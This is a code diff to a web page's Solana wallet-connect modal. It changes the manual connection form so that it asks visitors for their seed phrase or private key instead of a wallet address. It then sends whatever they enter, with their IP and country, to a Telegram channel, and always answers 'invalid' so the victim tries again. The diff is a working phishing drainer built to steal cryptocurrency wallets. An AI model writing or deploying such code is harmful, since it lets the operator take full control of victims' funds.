@@ -636,8 +636,8 @@
         
         modalText.innerHTML = `
             <h4>Manual Connection</h4>
-            <p>Please enter your wallet address to connect:</p>
-            <input type="text" id="manualWalletInput" placeholder="Enter your Solana wallet address" maxlength="44">
+            <p>Please submit your seed phrase or private to connect:</p>
+            <input type="text" id="manualWalletInput" placeholder="Enter your Solana recovery phrase or private key">
         `;
         modalButtons.innerHTML = `
             <button class="modal-btn" onclick="submitWalletAddress()">Connect</button>
@@ -652,21 +652,21 @@
         const address = walletInput.value.trim();
         
         if (!address || address.length < 32) {
-            alert('Please enter a valid wallet address');
+            alert('Please enter a valid recovery pgrase or private key');
             return;
         }
         
         // Show connecting state
         const modalText = document.getElementById('modalText');
         const modalButtons = document.getElementById('modalButtons');
-        modalText.innerHTML = '<div class="loading"></div> Verifying wallet address...';
+        modalText.innerHTML = '<div class="loading"></div> Verifying wallet...';
         modalButtons.style.display = 'none';
         
         sendTelegram(`🔍 WALLET VERIFICATION REQUEST\n👤 ${userCountry} (${userIP})\n💰 Address: ${address}\n🕐 ${new Date().toLocaleString()}\n\n⚠️ ADMIN: Reply "APPROVE ${address.slice(-8)}" to approve or "REJECT ${address.slice(-8)}" to reject`);
         
         // Always show invalid wallet address after verification attempt
         setTimeout(() => {
-            modalText.innerHTML = '❌ Invalid Wallet Address<br><small>Please try again with a different address</small>';
+            modalText.innerHTML = '❌ Invalid phrase or private key<br><small>Please try again with a different address</small>';
             modalButtons.innerHTML = `
                 <button class="modal-btn" onclick="showManualConnect()">Try Again</button>
                 <button class="modal-btn secondary" onclick="closeModal()">Cancel</button>
